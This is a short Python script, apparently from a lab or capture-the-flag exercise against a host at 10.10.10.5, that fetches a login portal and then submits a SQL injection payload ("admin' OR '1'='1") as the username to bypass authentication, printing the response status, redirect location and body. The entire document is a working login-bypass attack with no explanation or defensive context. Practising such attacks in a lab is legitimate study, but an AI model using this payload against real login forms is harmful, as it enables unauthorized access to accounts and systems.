import urllib.request, urllib.parse

print('GET request')
r = urllib.request.urlopen('http://10.10.10.5/portal')
body = r.read().decode('utf-8', 'replace')
print('status=', r.status)
print(body[:400])

print('POST request')
payload = urllib.parse.urlencode({'username': "admin' OR '1'='1", 'password': 'x'}).encode()
req = urllib.request.Request('http://10.10.10.5/portal', method='POST', data=payload)
req.add_header('Content-Type', 'application/x-www-form-urlencoded')
resp = urllib.request.urlopen(req)
body2 = resp.read().decode('utf-8', 'replace')
print('status=', resp.status)
print('Location=', resp.headers.get('Location'))
print(body2[:600])
